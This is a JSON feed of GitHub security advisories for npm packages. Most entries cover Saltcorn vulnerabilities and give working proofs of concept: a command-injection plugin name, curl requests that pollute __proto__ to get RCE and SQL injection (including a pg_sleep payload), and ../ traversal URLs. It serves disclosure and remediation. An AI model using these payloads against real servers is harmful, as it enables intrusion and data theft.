{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for JavaScript packages hosted at npmjs.com",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/npm.json",
    "description": "Security Advisory for JavaScript packages hosted at npmjs.com on GitHub",
    "items": [
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>When creating a new plugin using the <code>git</code> source, the user-controlled value <code>req.body.name</code> is used to build the plugin directory where the location will be cloned. The API used to execute the <code>git clone</code> command with the user-controlled data is <code>child_process.execSync</code>. Since the user-controlled data is not validated, a user with admin permission can add escaping characters and execute arbitrary commands, leading to a command injection vulnerability.</p>\n<h3 id=\"details\">Details</h3>\n<p>Relevant code from source (<code>req.body</code>) to sink (<code>child_process.execSync</code>).</p>\n<ul>\n<li>file: <a href=\"https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/server/routes/plugins.js#L1400\">https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/server/routes/plugins.js#L1400</a></li>\n</ul>\n<pre><code class=\"language-js\">router.post(\n  \"/\",\n  isAdmin,\n  error_catcher(async (req, res) =&gt; {\n    const plugin = new Plugin(req.body); // [1] \n      [...]\n      try {\n        await load_plugins.loadAndSaveNewPlugin( // [3] \n          plugin,\n          schema === db.connectObj.default_schema || plugin.source === \"github\"\n        );\n        [...]\n    }\n  })\n);\n</code></pre>\n<ul>\n<li>file: <a href=\"https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/saltcorn-data/models/plugin.ts#L44\">https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/saltcorn-data/models/plugin.ts#L44</a></li>\n</ul>\n<pre><code class=\"language-js\">class Plugin {\n  [...]\n  constructor(o: PluginCfg | PluginPack | Plugin) {\n    [...]\n    this.name = o.name; // [2] \n    [...]\n}\n</code></pre>\n<ul>\n<li>file: <a href=\"https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/server/load_plugins.js#L64-L65\">https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/server/load_plugins.js#L64-L65</a></li>\n</ul>\n<pre><code class=\"language-js\">const loadAndSaveNewPlugin = async (plugin, force, noSignalOrDB) =&gt; {\n  [...]\n  const loader = new PluginInstaller(plugin); // [4] \n  const res = await loader.install(force); // [7] \n  [...]\n};\n</code></pre>\n<ul>\n<li>file: <a href=\"https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/plugins-loader/plugin_installer.js#L41-L61\">https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/plugins-loader/plugin_installer.js#L41-L61</a></li>\n</ul>\n<pre><code class=\"language-js\">class PluginInstaller {\n  constructor(plugin, opts = {}) {\n    [...]\n    const tokens =\n      plugin.source === \"npm\"\n        ? plugin.location.split(\"/\")\n        : plugin.name.split(\"/\"); // [5] \n    [...]\n    this.tempDir = join(this.tempRootFolder, \"temp_install\", ...tokens); // [6] \n    [...]\n  }\n\n  \n  async install(force) {\n    [...]\n    if (await this.prepPluginsFolder(force, pckJSON)) { // [8] \n    [...]\n  }\n\n  async prepPluginsFolder(force, pckJSON) {\n    [...]\n    switch (this.plugin.source) {\n      [...]\n      case \"git\":\n        if (force || !(await pathExists(this.pluginDir))) { \n          await gitPullOrClone(this.plugin, this.tempDir); // [9] \n      [...]\n  }\n</code></pre>\n<ul>\n<li>file: <a href=\"https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/plugins-loader/download_utils.js#L112\">https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/plugins-loader/download_utils.js#L112</a></li>\n</ul>\n<pre><code class=\"language-js\">const gitPullOrClone = async (plugin, pluginDir) =&gt; {\n  [...]\n  if (fs.existsSync(pluginDir)) {\n    execSync(`git ${setKey} -C ${pluginDir} pull`);\n  } else {\n    execSync(`git ${setKey} clone ${plugin.location} ${pluginDir}`); // [10] \n  }\n  [...]\n};\n</code></pre>\n<h3 id=\"poc\">PoC</h3>\n<ul>\n<li>check that the file will be created by the command <code>echo \"hello\"&gt;/tmp/HACKED</code> does not exists:</li>\n</ul>\n<pre><code>cat /tmp/HACKED\ncat: /tmp/HACKED: No such file or directory\n</code></pre>\n<ul>\n<li>login with an admin account</li>\n<li>visit <code>http://localhost:3000/plugins/new</code></li>\n<li>enter the following fields:<ul>\n<li>Name: <code>;echo \"hello\"&gt;/tmp/HACKED</code></li>\n<li>Source: <code>git</code></li>\n<li>other fields blank</li>\n</ul>\n</li>\n<li>click <code>Create</code></li>\n<li>you will get an error saying <code>ENOENT: no such file or directory,  ....</code> but the command <code>touch /tmp/HACKED</code> will be executed</li>\n<li>to verify:</li>\n</ul>\n<pre><code>cat /tmp/HACKED\nhello\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>Remote code execution</p>\n<h3 id=\"recommended-mitigation\">Recommended Mitigation</h3>\n<p>Sanitize the <code>pluginDir</code> value before passing to <code>execSync</code>. Alternatively, use <code>child_process. execFileSync</code> API (docs: <a href=\"https://nodejs.org/api/child_process.html#child_processexecfilesyncfile-args-options\">https://nodejs.org/api/child_process.html#child_processexecfilesyncfile-args-options</a>)</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/saltcorn/saltcorn/security/advisories/GHSA-fm76-w8jw-xf8m\">https://github.com/saltcorn/saltcorn/security/advisories/GHSA-fm76-w8jw-xf8m</a></li>\n<li><a href=\"https://github.com/saltcorn/saltcorn/commit/024f19a7e079913f62f4a2335ab04116ddb68192\">https://github.com/saltcorn/saltcorn/commit/024f19a7e079913f62f4a2335ab04116ddb68192</a></li>\n<li><a href=\"https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/plugins-loader/download_utils.js#L112\">https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/plugins-loader/download_utils.js#L112</a></li>\n<li><a href=\"https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/plugins-loader/plugin_installer.js#L41-L61\">https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/plugins-loader/plugin_installer.js#L41-L61</a></li>\n<li><a href=\"https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/saltcorn-data/models/plugin.ts#L44\">https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/saltcorn-data/models/plugin.ts#L44</a></li>\n<li><a href=\"https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/server/load_plugins.js#L64-L65\">https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/server/load_plugins.js#L64-L65</a></li>\n<li><a href=\"https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/server/routes/plugins.js#L1400\">https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/server/routes/plugins.js#L1400</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-fm76-w8jw-xf8m\">https://github.com/advisories/GHSA-fm76-w8jw-xf8m</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-fm76-w8jw-xf8m",
            "title": "[@saltcorn/plugins-loader] @saltcorn/plugins-loader unsanitized plugin name leads to a remote code execution (RCE) vulnerability when creating plugins using git source",
            "date_modified": "2024-10-03T22:21:26.000Z",
            "date_published": "2024-10-03T22:21:24.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-fm76-w8jw-xf8m"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The endpoint <code>/site-structure/localizer/save-string/:lang/:defstring</code> accepts two parameter values: <code>lang</code> and <code>defstring</code>. These values are used in an unsafe way to set the keys and value of the <code>cfgStrings</code> object. It allows to add/modify properties of the <code>Object prototype</code> that result in several logic issues, including:</p>\n<ul>\n<li>RCE vulnerabilities by polluting the <code>tempRootFolder</code> property </li>\n<li>SQL injection vulnerabilities by polluting the <code>schema</code> property when using <code>PostgreSQL</code> database.</li>\n</ul>\n<h3 id=\"details\">Details</h3>\n<ul>\n<li>file: <a href=\"https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/server/routes/infoarch.js#L236-L239\">https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/server/routes/infoarch.js#L236-L239</a></li>\n</ul>\n<pre><code class=\"language-js\">router.post(\n  \"/localizer/save-string/:lang/:defstring\",\n  isAdmin,\n  error_catcher(async (req, res) =&gt; {\n    const { lang, defstring } = req.params; // source\n\n    const cfgStrings = getState().getConfigCopy(\"localizer_strings\");\n    if (cfgStrings[lang]) cfgStrings[lang][defstring] = text(req.body.value); // [1] sink\n    else cfgStrings[lang] = { [defstring]: text(req.body.value) };\n    await getState().setConfig(\"localizer_strings\", cfgStrings);\n    res.redirect(`/site-structure/localizer/edit/${lang}`);\n  })\n);\n</code></pre>\n<h3 id=\"poc\">PoC</h3>\n<p>Setup:</p>\n<ul>\n<li>set <code>SALTCORN_NWORKERS=1</code> before starting the <code>saltcorn</code> server (to easily observe the behavior of the PoC)</li>\n</ul>\n<pre><code>SALTCORN_NWORKERS=1 saltcorn serve\n</code></pre>\n<ul>\n<li>make sure to use PostgresSQL backend</li>\n<li>login with a user with admin permission</li>\n</ul>\n<h4 id=\"rce\">RCE</h4>\n<p>This PoC demonstrates how to escalate the Prototype Pollution vulnerability to change the behavior of certain command executed.</p>\n<ul>\n<li>check that the file that will be created does not exists:</li>\n</ul>\n<pre><code>cat /tmp/RCE\ncat: /tmp/RCE: No such file or directory\n</code></pre>\n<ul>\n<li>pollute the <code>Object.prototype</code> with a <code>tempRootFolder</code> value set to <code>;echo+\"rce\"|tee+/tmp/RCE;</code> by sending the following request *** :</li>\n</ul>\n<pre><code class=\"language-bash\">curl -i -X $'POST' \\\n    -H $'Host: localhost:3000' \\\n    -H $'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H $'Accept: */*' \\\n    -H $'Origin: http://localhost:3000' \\\n    -H $'Connection: close' \\\n    -b $'loggedin=true; connect.sid=VALID_CONNECT_SID_COOKIE' \\\n    --data-binary $'_csrf=VALID_csrf_Value&amp;value=;echo+\"rce\"|tee+/tmp/RCE;' \\\n    $'http://localhost:3000/site-structure/localizer/save-string/__proto__/tempRootFolder'\n</code></pre>\n<p> visit <code>http://localhost:3000/plugins/new</code></p>\n<ul>\n<li>enter the following fields:<ul>\n<li>Name: <code>test</code></li>\n<li>Source: <code>git</code></li>\n<li>other fields blank</li>\n<li>click <code>Create</code></li>\n</ul>\n</li>\n<li>you will get an error but the command <code>echo \"rce\" | tee /tmp/RCE</code> will be executed</li>\n<li>to verify:</li>\n</ul>\n<pre><code>cat /tmp/RCE\nrce\n</code></pre>\n<p>The RCE occurs because after the previous curl request, the <code>tempRootFolder</code> property is set to <code>;echo+\"rce\"|tee+/tmp/RCE;</code> that is later used to build the shell commands.</p>\n<ul>\n<li>file: <a href=\"https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/plugins-loader/plugin_installer.js#L45-L58\">https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/plugins-loader/plugin_installer.js#L45-L58</a></li>\n</ul>\n<pre><code class=\"language-js\">class PluginInstaller {\n  constructor(plugin, opts = {}) { // opts will have the tempRootFolder property set with dangerous values // [2]\n    [...]\n    this.tempRootFolder =\n      opts.tempRootFolder || envPaths(\"saltcorn\", { suffix: \"tmp\" }).temp; // [3]\n     [...]\n    this.pckJsonPath = join(this.pluginDir, \"package.json\");\n    this.tempDir = join(this.tempRootFolder, \"temp_install\", ...tokens); // [4]\n    [...]\n  }\n  [...]\n}\n</code></pre>\n<h4 id=\"sql-injection\">SQL Injection</h4>\n<p>This PoC demonstrates how to escalate the Prototype Pollution vulnerability to change the behavior of certain SQL queries (i.e SQLi).</p>\n<ul>\n<li>visit <code>http://localhost:3000/table</code> to check the page returns some results (no errors)</li>\n<li>pollute the <code>Object.prototype</code> with a schema value set to <code>\"</code> (just to create an exception in the query that will be executed to demonstrate the issue) by sending the following request *** :</li>\n</ul>\n<pre><code>curl -i -X $'POST' \\\n    -H $'Host: localhost:3000' \\\n    -H $'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H $'Accept: */*' \\\n    -H $'Origin: http://localhost:3000' \\\n    -H $'Connection: close' \\\n    -b $'loggedin=true; connect.sid=VALID_CONNECT_SID_COOKIE' \\\n    --data-binary $'_csrf=VALID_csrf_Value&amp;value=\\\"' \\\n    $'http://localhost:3000/site-structure/localizer/save-string/__proto__/schema'\n</code></pre>\n<ul>\n<li>visit again <code>http://localhost:3000/table</code> but this time an SQL error will appear:</li>\n</ul>\n<pre><code>syntax error at or near \"\" order by lower(\"\"\n</code></pre>\n<p><strong>NOTE</strong>: Another payload to use as <code>value</code> could be <code>pg_user\"+WHERE+1=1+AND+(SELECT+pg_sleep(5))+IS+NOT+NULL+--</code></p>\n<p>The SQL injection occurs because after the previous curl request, the <code>schema</code> property is set to <code>\"</code>.</p>\n<ul>\n<li>file: <a href=\"https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/postgres/postgres.js#L101\">https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/postgres/postgres.js#L101</a></li>\n</ul>\n<pre><code class=\"language-js\">const select = async (tbl, whereObj, selectopts = {}) =&gt; { // [2] selectopts\n  const { where, values } = mkWhere(whereObj);\n  const schema = selectopts.schema || getTenantSchema(); // [3] selectopts.schema\n  const sql = `SELECT ${\n    selectopts.fields ? selectopts.fields.join(\", \") : `*`\n  } FROM \"${schema}\".\"${sqlsanitize(tbl)}\" ${where} ${mkSelectOptions( // [4] schema\n    selectopts,\n    values,\n    false\n  )}`;\n  sql_log(sql, values);\n  const tq = await (client || selectopts.client || pool).query(sql, values);\n\n  return tq.rows;\n};\n</code></pre>\n<p>*** Retrieve valid values for the <code>connect.sid</code> (<code>VALID_CONNECT_SID_COOKIE</code>) and <code>_csrf</code> values (<code>VALID_csrf_Value</code>) :</p>\n<ul>\n<li>open the browser developer console and go to the <code>Network</code> tab</li>\n<li>visit <code>http://localhost:3000/site-structure/localizer/add-lang</code></li>\n<li>add a language (<code>Name: test</code> , <code>Locale: test</code>) and click <code>Save</code></li>\n<li>under the <code>Network</code> tab, filter for <code>save-lang</code> and check the request parameters (<code>Headers</code> and <code>Payload</code>/<code>Request</code> tabs)</li>\n<li>copy the values for <code>connect.sid</code> and <code>_csrf</code> and paste in the curl command above</li>\n</ul>\n<h3 id=\"impact\">Impact</h3>\n<p>Remote code execution (RCE), Sql injection and business logic errors.</p>\n<h3 id=\"recommended-mitigation\">Recommended Mitigation</h3>\n<p>Check the values of <code>lang</code> and  <code>defstring</code> parameters against dangerous properties like <code>__proto__</code>, <code>constructor</code>, <code>prototype</code>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/saltcorn/saltcorn/security/advisories/GHSA-78p3-fwcq-62c2\">https://github.com/saltcorn/saltcorn/security/advisories/GHSA-78p3-fwcq-62c2</a></li>\n<li><a href=\"https://github.com/saltcorn/saltcorn/commit/9e066ae8ba317469053cc27e95dcdf5b6e60e12d\">https://github.com/saltcorn/saltcorn/commit/9e066ae8ba317469053cc27e95dcdf5b6e60e12d</a></li>\n<li><a href=\"https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/server/routes/infoarch.js#L236-L239\">https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/server/routes/infoarch.js#L236-L239</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-78p3-fwcq-62c2\">https://github.com/advisories/GHSA-78p3-fwcq-62c2</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-78p3-fwcq-62c2",
            "title": "[@saltcorn/server] @saltcorn/server Remote Code Execution (RCE) / SQL injection via prototype pollution  by manipulating `lang` and  `defstring` parameters when setting localizer strings",
            "date_modified": "2024-10-03T19:51:00.000Z",
            "date_published": "2024-10-03T19:50:59.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-78p3-fwcq-62c2"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>A user with admin permission can read arbitrary file and directory names on the filesystem by calling the <code>admin/build-mobile-app/result?build_dir_name=</code> endpoint.  The <code>build_dir_name</code> parameter is not properly validated and it's then used to construct the <code>buildDir</code> that is read. The file/directory names under the <code>buildDir</code> will be returned. </p>\n<h3 id=\"details\">Details</h3>\n<ul>\n<li>file: <a href=\"https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/server/routes/admin.js#L2884-L2893\">https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/server/routes/admin.js#L2884-L2893</a></li>\n</ul>\n<pre><code class=\"language-js\">router.get(\n  \"/build-mobile-app/result\",\n  isAdmin,\n  error_catcher(async (req, res) =&gt; {\n    const { build_dir_name } = req.query; // [1] source\n    const rootFolder = await File.rootFolder();\n    const buildDir = path.join(\n      rootFolder.location,\n      \"mobile_app\",\n      build_dir_name // [2]\n    );\n    const files = await Promise.all(\n      fs\n        .readdirSync(buildDir) // [3] sink\n        .map(async (outFile) =&gt; await File.from_file_on_disk(outFile, buildDir))\n    );\n    [...]\n  })\n);\n</code></pre>\n<h3 id=\"poc\">PoC</h3>\n<ul>\n<li>log into the application as an admin user</li>\n<li>visit the following url: <code>http://localhost:3000/admin/build-mobile-app/result?build_dir_name=/../../../../../../../../</code></li>\n</ul>\n<p><strong>NOTE</strong>: it's possible to only see file and directory names but not to download their content.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>Information disclosure</p>\n<h3 id=\"recommended-mitigation\">Recommended Mitigation</h3>\n<p>Resolve the <code>buildDir</code> and check if it starts with <code>${rootFolder.location}/mobile_app</code>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/saltcorn/saltcorn/security/advisories/GHSA-cfqx-f43m-vfh7\">https://github.com/saltcorn/saltcorn/security/advisories/GHSA-cfqx-f43m-vfh7</a></li>\n<li><a href=\"https://github.com/saltcorn/saltcorn/commit/81adaf78430a9b59804894574d67d2a0c7bb3dc5\">https://github.com/saltcorn/saltcorn/commit/81adaf78430a9b59804894574d67d2a0c7bb3dc5</a></li>\n<li><a href=\"https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/server/routes/admin.js#L2884-L2893\">https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/server/routes/admin.js#L2884-L2893</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-cfqx-f43m-vfh7\">https://github.com/advisories/GHSA-cfqx-f43m-vfh7</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-cfqx-f43m-vfh7",
            "title": "[@saltcorn/server] @saltcorn/server arbitrary file and directory listing when accessing build mobile app results",
            "date_modified": "2024-10-03T19:46:45.000Z",
            "date_published": "2024-10-03T19:46:42.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-cfqx-f43m-vfh7"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>A user with admin permission can read and download arbitrary zip files when downloading auto backups. The file name used to identify the zip file is not properly sanitized when passed to <code>res.download</code> API.</p>\n<h3 id=\"details\">Details</h3>\n<ul>\n<li>file: <a href=\"https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/server/routes/admin.js#L671-L682\">https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/server/routes/admin.js#L671-L682</a></li>\n</ul>\n<pre><code class=\"language-js\">router.get(\n  \"/auto-backup-download/:filename\",\n  isAdmin,\n  error_catcher(async (req, res) =&gt; {\n    const { filename } = req.params; // [1] source\n    [...]\n    if (\n      !isRoot ||\n      !(filename.startsWith(backup_file_prefix) &amp;&amp; filename.endsWith(\".zip\")) // [2]\n    ) {\n      res.redirect(\"/admin/backup\");\n      return;\n    }\n    const auto_backup_directory = getState().getConfig(\"auto_backup_directory\");\n    res.download(path.join(auto_backup_directory, filename), filename); // [3] sink\n  })\n);\n</code></pre>\n<h3 id=\"steps-to-reproduce-poc\">Steps to reproduce (PoC)</h3>\n<ul>\n<li>create a file with <code>.zip</code> extension under <code>/tmp</code> folder:</li>\n</ul>\n<pre><code>echo \"secret12345\" &gt; /tmp/secret.zip\n</code></pre>\n<ul>\n<li>log into the application as an admin user</li>\n<li>visit the url   <code>http://localhost:3000/admin/auto-backup-download/sc-backup-%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2ftmp%2fsecret.zip</code></li>\n<li>download the zip file and then check if the zip was indeed downloaded:</li>\n</ul>\n<pre><code class=\"language-bash\">cat secret.zip\nsecret12345\n</code></pre>\n<ul>\n<li>Alternatively send the following request to retrieve the file just created.</li>\n</ul>\n<pre><code class=\"language-bash\">curl -i -X $'GET' \\\n    -H $'Host: localhost:3000' \\\n    -H $'Connection: close' \\\n    -b $'connect.sid=VALID_CONNECT_SID_COOKIE' \\\n    $'http://localhost:3000/admin/auto-backup-download/sc-backup-%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2ftmp%2fsecret.zip'\n</code></pre>\n<p><strong>NOTE</strong>:\nTo obtain a valid <code>connect.sid</code> cookie, just open the developer console while logged and retrieve the cookie value.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>Arbitrary zip files download (information disclosure).</p>\n<h3 id=\"recommended-mitigation\">Recommended Mitigation</h3>\n<p>Resolve the <code>filename</code> parameter before checking if it starts with <code>backup_file_prefix</code> .</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/saltcorn/saltcorn/security/advisories/GHSA-277h-px4m-62q8\">https://github.com/saltcorn/saltcorn/security/advisories/GHSA-277h-px4m-62q8</a></li>\n<li><a href=\"https://github.com/saltcorn/saltcorn/commit/024f19a7e079913f62f4a2335ab04116ddb68192\">https://github.com/saltcorn/saltcorn/commit/024f19a7e079913f62f4a2335ab04116ddb68192</a></li>\n<li><a href=\"https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/server/routes/admin.js#L671-L682\">https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/server/routes/admin.js#L671-L682</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-277h-px4m-62q8\">https://github.com/advisories/GHSA-277h-px4m-62q8</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-277h-px4m-62q8",
            "title": "[@saltcorn/server] @saltcorn/server arbitrary file zip read and download when downloading auto backups",
            "date_modified": "2024-10-03T19:46:15.000Z",
            "date_published": "2024-10-03T19:46:12.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-277h-px4m-62q8"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>In case a Prototype Pollution vulnerability is present in a user's application or bundled libraries, the Sentry SDK could potentially serve as a gadget to exploit that vulnerability. The exploitability depends on the specific details of the underlying Prototype Pollution issue.</p>\n<blockquote>\n<p>[!NOTE]\nThis advisory does not indicate the presence of a Prototype Pollution within the Sentry SDK itself. Users are strongly advised to first address any Prototype Pollution vulnerabilities in their application, as they pose a more critical security risk.</p>\n</blockquote>\n<h3 id=\"patches\">Patches</h3>\n<p>The issue was patched in all Sentry JavaScript SDKs starting from the <a href=\"https://github.com/getsentry/sentry-javascript/releases/tag/8.33.0\">8.33.0</a> version.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://portswigger.net/web-security/prototype-pollution\">Prototype Pollution</a></li>\n<li><a href=\"https://portswigger.net/web-security/prototype-pollution#prototype-pollution-gadgets\">Prototype Pollution gadgets</a></li>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/pull/13838\">sentry-javascript#13838</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/security/advisories/GHSA-593m-55hh-j8gv\">https://github.com/getsentry/sentry-javascript/security/advisories/GHSA-593m-55hh-j8gv</a></li>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/pull/13838\">https://github.com/getsentry/sentry-javascript/pull/13838</a></li>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/commit/35bdc87dee3498794e34c1ad35dd9927950c8766\">https://github.com/getsentry/sentry-javascript/commit/35bdc87dee3498794e34c1ad35dd9927950c8766</a></li>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/releases/tag/8.33.0\">https://github.com/getsentry/sentry-javascript/releases/tag/8.33.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-593m-55hh-j8gv\">https://github.com/advisories/GHSA-593m-55hh-j8gv</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-593m-55hh-j8gv",
            "title": "[@sentry/browser] Sentry SDK Prototype Pollution gadget in JavaScript SDKs",
            "date_modified": "2024-10-03T18:26:53.000Z",
            "date_published": "2024-10-03T18:26:53.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-593m-55hh-j8gv"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Configuration supplied through <code>APP_CONFIG_*</code> environment variables, for example <code>APP_CONFIG_backend_listen_port=7007</code>, where unexpectedly ignoring the visibility defined in configuration schema. This occurred even if the configuration schema specified that they should have backend or secret visibility. This was an intended feature of the <code>APP_CONFIG_*</code> way of supplying configuration, but now clearly goes against the expected behavior of the configuration system. This behavior leads to a risk of potentially exposing sensitive configuration details intended to remain private or restricted to backend processes.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The issue has been resolved in version <code>0.3.75</code> of the <code>@backstage/plugin-app-backend</code> package. Users are encouraged to upgrade to this version to mitigate the vulnerability.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>As a temporary measure, avoid supplying secrets using the <code>APP_CONFIG_</code> configuration pattern. Consider alternative methods for setting secrets, such as the <a href=\"https://backstage.io/docs/conf/writing#environment-variable-substitution\">environment substitution</a> available for Backstage configuration.</p>\n<h3 id=\"references\">References</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<p>Open an issue in the <a href=\"https://github.com/backstage/backstage\">Backstage repository</a>\nVisit our Discord, linked to in <a href=\"https://github.com/backstage/backstage\">Backstage README</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/backstage/backstage/security/advisories/GHSA-qc4v-xq2m-65wc\">https://github.com/backstage/backstage/security/advisories/GHSA-qc4v-xq2m-65wc</a></li>\n<li><a href=\"https://github.com/backstage/backstage/commit/323e6129073c5cb4cc106a1239eaec31a129554f\">https://github.com/backstage/backstage/commit/323e6129073c5cb4cc106a1239eaec31a129554f</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-47762\">https://nvd.nist.gov/vuln/detail/CVE-2024-47762</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qc4v-xq2m-65wc\">https://github.com/advisories/GHSA-qc4v-xq2m-65wc</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qc4v-xq2m-65wc",
            "title": "[@backstage/plugin-app-backend] Unexpected visibility of environment variable configurations in @backstage/plugin-app-backend",
            "date_modified": "2024-10-03T18:41:12.000Z",
            "date_published": "2024-10-03T16:51:24.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qc4v-xq2m-65wc"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>OpenC3 COSMOS stores the password of a user unencrypted in the LocalStorage of a web browser. This makes the user password susceptible to exfiltration via Cross-site scripting (see GHSL-2024-128).</p>\n<p>Note: This CVE only affects Open Source edition, and not OpenC3 COSMOS Enterprise Edition</p>\n<h3 id=\"impact\">Impact</h3>\n<p>This issue may lead to Information Disclosure.</p>\n<p><strong>NOTE:</strong> The complete advisory with much more information is added as <a href=\"https://github.com/OpenC3/cosmos/security/advisories/GHSA-4xqv-47rm-37mm#advisory-comment-104905\">comment</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/OpenC3/cosmos/security/advisories/GHSA-4xqv-47rm-37mm\">https://github.com/OpenC3/cosmos/security/advisories/GHSA-4xqv-47rm-37mm</a></li>\n<li><a href=\"https://github.com/OpenC3/cosmos/commit/b5ab34fe7fa54c0c8171c4aa3caf4e03d6f63bd7\">https://github.com/OpenC3/cosmos/commit/b5ab34fe7fa54c0c8171c4aa3caf4e03d6f63bd7</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-47529\">https://nvd.nist.gov/vuln/detail/CVE-2024-47529</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4xqv-47rm-37mm\">https://github.com/advisories/GHSA-4xqv-47rm-37mm</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-4xqv-47rm-37mm",
            "title": "[@openc3/tool-common] OpenC3 stores passwords in clear text (`GHSL-2024-129`)",
            "date_modified": "2024-10-02T21:41:53.000Z",
            "date_published": "2024-10-02T19:29:35.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-4xqv-47rm-37mm"
            },
            "tags": [
                "severity"
            ]
        },
        {
